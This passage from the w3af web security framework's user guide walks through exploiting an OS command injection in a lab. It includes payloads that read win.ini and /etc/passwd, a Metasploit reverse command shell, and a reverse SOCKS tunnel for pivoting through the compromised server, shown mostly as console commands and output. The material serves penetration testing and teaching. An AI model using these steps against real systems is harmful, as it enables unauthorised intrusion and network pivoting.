<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Starting
osCommanding plugin execution. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">OS
Commanding was found at: http://172.16.1.128/os.php . Using method:
GET. The data sent was: cmd=type+%25SYSTEMROOT%25%5Cwin.ini The
vulnerability was found in the request with id 7. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
exploit </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit&gt;&gt;&gt;</B>
exploit osCommandingShell </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">osCommanding
exploit plugin is starting. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">The
vulnerability was found using method GET, tried to change the method
to POST for exploiting but failed. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Vulnerability
successfully exploited. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Execute
&quot;exitPlugin&quot; to get out of the remote shell. Commands typed
in this menu will be runned on the remote web server. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit/osCommandingShell&gt;&gt;&gt;</B>
<B>start vdaemon </B></FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Virtual
daemon service is running on port 9091, use metasploit's w3af_vdaemon
module to exploit it. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit/osCommandingShell&gt;&gt;&gt;
</B></FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
</P>
<P ALIGN=JUSTIFY>Nothing special for now, just added the new “<FONT FACE="Nimbus Mono L, monospace"><SPAN STYLE="font-weight: medium">start
vdaemon</SPAN></FONT>” command. With this w3af run we have covered
items 1. and 2. of the theory. The next step is to configure the MSF
module and run it; my preferred way is to use metasploit's web
interface “msfweb”. The first step is to click on the “Exploit”
button on the main menu. This will cause a small window to appear. In
this window, you should search for <I>w3af </I>and then select the
exploit named: “w3af virtual daemon exploit”. Some important
points to have in mind while configuring the w3af agent virtual
daemon module inside MSF:</P>
<UL>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
	target is of course the remote operating system you are exploiting</FONT></P>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">VNC
	payloads don't seem to work</FONT></P>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">RHOST
	parameter indicates the IP address of the server you are exploiting</FONT></P>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">LHOST
	is your public IP address</FONT></P>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">LPORT
	is a port where the remote web server can connect to (when using
	reverse connect payloads) or you can connect to ( when using bind
	payloads )</FONT></P>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
	w3af module inside metasploit will connect to localhost:9091 and do
	all the payload transfer, this parameters can't be configured and
	must not be confused with RHOST/LHOST and LPORT</FONT></P>
</UL>
<P ALIGN=JUSTIFY><BR><BR>
</P>
<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">Once it
has been configured, we can click on “Launch Exploit” to start
the process, this is what we will see in the w3af console:</FONT></P>
<P ALIGN=JUSTIFY><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit/osCommandingShell&gt;&gt;&gt;</B>
</FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Please
wait some seconds while w3af performs an extrusion scan. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">The
extrusion test failed, no reverse connect transfer methods can be
used. Trying inband echo transfer method. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Error:
The user running w3af can't sniff on the specified interface. Hints:
Are you root? Does this interface exist? </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Successfully
transfered the MSF payload to the remote server. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Successfully
executed the MSF payload on the remote server. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
</P>
<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
last messages are printed when you run w3af as a normal user, the
reason is </FONT><FONT FACE="Bitstream Vera Sans, sans-serif">simple,
when you run w3af as a user you can't sniff and </FONT>therefore<FONT FACE="Bitstream Vera Sans, sans-serif">
can't perform a </FONT><FONT FACE="Bitstream Vera Sans, sans-serif">successful
extrusion scan. A successful extrusion scan would look like:</FONT></P>
<P ALIGN=JUSTIFY><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Please
wait some seconds while w3af performs an extrusion scan. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">ExtrusionServer
listening on interface: eth1</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Finished
extrusion scan. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">The
remote host: &quot;172.10.10.1&quot; can connect to w3af with these
ports: </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
25/TCP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
80/TCP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
53/TCP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
1433/TCP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
8080/TCP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
53/UDP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
69/UDP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
139/UDP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
1025/UDP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">The
following ports are not bound to a local process and can be used by
w3af: </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
25/TCP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
53/TCP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
1433/TCP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
8080/TCP </FONT>
</P>
<P ALIGN=JUSTIFY><FONT FACE="Nimbus Mono L, monospace">Selecting port
&quot;8080/TCP&quot; for inbound connections from the compromised
server to w3af. </FONT>
</P>
<P ALIGN=JUSTIFY><BR><BR>
</P>
<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">And if
we take a look at the metasploit web interface we will find something
far more interesting:</FONT></P>
<P ALIGN=JUSTIFY><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
Started reverse handler </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
The remote IP address is: 172.16.1.128 </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
Using remote IP address to create payloads. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
Sent payload to vdaemon. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
The estimated time to wait for the extrusion scan to complete is: 1
seconds. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
Done waiting! </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
The estimated time to wait for PE/ELF transfer is: 8 seconds. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
Waiting... </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
Done waiting! </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
Going to wait for 27 seconds (waiting for crontab/at to execute
payload). </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
The session could start before the handler, so please *be patient*. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
Command shell session 1 opened (172.16.1.1:4444 -&gt;
172.16.1.128:1047) </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
Done waiting! </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">[*]
Starting handler </FONT>
</P>
<OL TYPE=I START=100>
	<P ALIGN=JUSTIFY><FONT FACE="Nimbus Mono L, monospace">Microsoft
	Windows 2000 [Version 5.00.2195] </FONT>
	</P>
	<P ALIGN=JUSTIFY><FONT FACE="Nimbus Mono L, monospace">(C) Copyright
	1985-2000 Microsoft Corp.</FONT></P>
	<P ALIGN=JUSTIFY></P>
	<P ALIGN=JUSTIFY><FONT FACE="Nimbus Mono L, monospace">C:\WINNT\system32&gt;</FONT></P>
</OL>
<P ALIGN=JUSTIFY><BR><BR>
</P>
<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">Now the
user has an interactive shell with the privileges of the user running
the web server, that can be used without any restrictions. It is
possible at this point to close w3af  and continue working directly
from the metasploit shell.</FONT></P>
<P ALIGN=JUSTIFY><BR><BR>
</P>
<H3 CLASS="western" ALIGN=JUSTIFY STYLE="margin-top: 0in"><FONT FACE="Bitstream Vera Sans, sans-serif">w3afAgent</FONT></H3>
<P ALIGN=JUSTIFY><BR><BR>
</P>
<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">As said
before, this feature allows you to create a reverse tunnel that will
route TCP connections through the compromised server. Unlike virtual
daemon, this  feature is ready to use and doesn't require any other
software. B<FONT FACE="Bitstream Vera Sans, sans-serif">efore going
through an example to see how to use this feature, we will make a
summary of the steps that will happen during exploitation:</FONT></FONT></P>
<OL>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">w3af
	finds a vulnerability that allows remote command execution</FONT></P>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
	user exploits the vulnerability and starts the w3afAgent</FONT></P>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">w3af
	performs an extrusion scan by sending a small executable to the
	remote server. This executable connects back to w3af and allows the
	framework to identify outgoing firewall rules on the remote network.</FONT></P>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">w3afAgent
	Manager will send a w3afAgentClient to the remote server. <FONT FACE="Bitstream Vera Sans, sans-serif">The
	process of uploading the file to the remote server depends on the
	remote operating system, the privileges of the user running w3af and
	the local operating system; but in most cases the following happens:</FONT></FONT></P>
</OL>
<UL>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">w3af
	reuses the information from the first extrusion scan, which was
	performed in step 3 in order to know which port it can use to listen
	for connections from the compromised server.</FONT></P>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">If
	a TCP port is found to be allowed in the remote firewall, w3af will
	try to run a server on that port and make a reverse connection from
	the compromised in order to download the PE/ELF generated file. If
	no TCP ports are enabled, w3af will send the ELF/PE file to the
	remote server using several calls to the “echo” command, which
	is rather slow, but should always work because it's an in-band
	transfer method.</FONT></P>
</UL>
<OL>
	<LI VALUE=1><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">w3afAgent
	Manager starts the w3afAgentServer that will bind on localhost:1080
	(which will be used by the w3af user) and on the interface
	configured in w3af ( misc-settings-&gt;interface ) on the port
	discovered during step 3.</FONT></P>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
	w3afAgentClient connects back to the w3afAgentServer, successfully
	creating the tunnel</FONT></P>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
	user configures the proxy listening on localhost:1080 on his
	preferred software</FONT></P>
	<LI><P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">When
	the program connects to the socks proxy, all outgoing connections
	are routed through the compromised server</FONT></P>
</OL>
<P ALIGN=JUSTIFY><BR><BR>
</P>
<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">Now
that we know the theory, let's see an example of what this feature
can do:</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>$</B>
./w3af_console</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
plugins </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
audit osCommanding </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
audit </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Enabled
audit plugins: </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">osCommanding
</FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/plugins&gt;&gt;&gt;</B>
back </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
target </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/target&gt;&gt;&gt;</B>
set target http://172.10.10.1/w3af/v.php?c=list </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/target&gt;&gt;&gt;</B>
back </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
start </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">The
list of found URLs is: </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
<FONT FACE="Nimbus Mono L, monospace">http://172.10.10.1/w3af/v.php</FONT>
</FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Found
1 URLs and 1 different points of injection. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">The
list of Fuzzable requests is: </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
<FONT FACE="Nimbus Mono L, monospace">http://172.10.10.1/w3af/v.php</FONT>
| Method: GET | Parameters: (c) </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Starting
osCommanding plugin execution. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">OS
Commanding was found at: <FONT FACE="Nimbus Mono L, monospace">http://172.10.10.1/w3af/v.php</FONT>
. Using method: GET. The data sent was:
c=%2Fbin%2Fcat+%2Fetc%2Fpasswd The vulnerability was found in the
request with id 2. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af&gt;&gt;&gt;</B>
exploit </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit&gt;&gt;&gt;</B>
exploit osCommandingShell </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">osCommanding
exploit plugin is starting. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">The
vulnerability was found using method GET, tried to change the method
to POST for exploiting but failed. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Vulnerability
successfully exploited. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Execute
&quot;exitPlugin&quot; to get out of the remote shell. Commands typed
in this menu will be runned on the remote web server. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
</P>
<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">Nothing
really new until now, we configured w3af, started the scan and
exploited the vulnerability.</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>w3af/exploit/osCommandingShell&gt;&gt;&gt;</B>
<B>start w3afAgent </B></FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Initializing
w3afAgent system, please wait. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Please
wait some seconds while w3af performs an extrusion scan. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">The
extrusion scan failed. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Error:
The user running w3af can't sniff on the specified interface. Hints:
Are you root? Does this interface exist? </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Using
inbound port &quot;5060&quot; without knowing if the remote host will
be able to connect back. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
</P>
<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">The
last messages are printed when you run w3af as a normal user, the
reason is simple, when you run w3af as a user you can't sniff and
therefor can't perform a successful extrusion scan. A successful
extrusion scan would look like:</FONT></P>
<P ALIGN=JUSTIFY><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Please
wait some seconds while w3af performs an extrusion scan. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">ExtrusionServer
listening on interface: eth1</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Finished
extrusion scan. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">The
remote host: &quot;172.10.10.1&quot; can connect to w3af with these
ports: </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
25/TCP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
80/TCP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
53/TCP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
1433/TCP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
8080/TCP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
53/UDP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
69/UDP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
139/UDP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
1025/UDP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">The
following ports are not bound to a local process and can be used by
w3af: </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
25/TCP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
53/TCP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
1433/TCP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">-
8080/TCP </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Selecting
port &quot;8080/TCP&quot; for inbound connections from the
compromised server to w3af. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
</P>
<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">In both
cases (superuser and user), these should be the following steps:</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Starting
w3afAgentClient upload. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Finished
w3afAgentClient upload. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Please
wait 30 seconds for w3afAgentClient execution. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">w3afAgent
service is up and running. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">You
may start using the w3afAgent that is listening on port 1080. All
connections made through this SOCKS daemon will be relayed using the
compromised server. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
</P>
<P ALIGN=JUSTIFY><FONT FACE="Bitstream Vera Sans, sans-serif">And
now, from another console we can use a socksClient to route
connections through the compromised server:</FONT></P>
<P ALIGN=JUSTIFY><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>$</B>
nc <FONT FACE="Nimbus Mono L, monospace">172.10.10.1 22</FONT></FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">(UNKNOWN)
[172.10.10.1] 22 (ssh) : Connection refused </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>$</B>
python socksClient.py 127.0.0.1 22</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">SSH-2.0-OpenSSH_4.3p2
Debian-8ubuntu1 </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">Protocol
mismatch. </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace"><B>$</B>
cat socksClient.py</FONT></P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">import
extlib.socksipy.socks as socks </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">import
sys </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">s
= socks.socksocket() </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">s.setproxy(socks.PROXY_TYPE_SOCKS4,&quot;localhost&quot;)
</FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">s.connect((sys.argv[1],int(sys.argv[2])))
</FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">s.send('\n')
</FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><FONT FACE="Nimbus Mono L, monospace">print
s.recv(1024) </FONT>
</P>
<P ALIGN=JUSTIFY STYLE="margin-left: 0.49in"><BR><BR>
</P>
<P ALIGN=JUSTIFY><BR><BR>
</P>
<H2 CLASS="western" ALIGN=JUSTIFY STYLE="margin-top: 0in">More
information</H2>
<P><BR><BR>
</P>
<P><FONT FACE="Bitstream Vera Sans, sans-serif">More information
about the framework, like: HOWTOs, advanced usage, bugs, TODO list
and news, can be found in the project homepage:</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Bitstream Vera Sans, sans-serif"><A HREF="http://w3af.sf.net/">http://w3af.sf.net/</A></FONT></P>
<P><BR><BR>
</P>
<P><FONT FACE="Bitstream Vera Sans, sans-serif">The w3af project has
two mailing lists, one for developers and one for users. If you have
any question or comment about the framework, don't hesitate and send
an email to any of the mailing lists, which can be located at:</FONT></P>
<P STYLE="margin-left: 0.49in"><FONT FACE="Bitstream Vera Sans, sans-serif"><A HREF="http://sourceforge.net/mail/?group_id=170274">http://sourceforge.net/mail/?group_id=170274</A></FONT></P>
<P><BR><BR>
</P>
<H2 CLASS="western"></H2>
<H2 CLASS="western">Bugs</H2>
<P><BR><BR>
</P>
<P ALIGN=JUSTIFY>The framework is still under development and has <I>a
couple </I><SPAN STYLE="font-style: normal">of </SPAN>known bugs. <FONT FACE="Bitstream Vera Sans, sans-serif">If
you downloaded the latest release package and find a bug, please
perform a SVN checkout and try to reproduce the bug in the latest
version, if you are still able to reproduce it, please report the bug
with a detailed description. To report a bug please navigate to:</FONT></P>
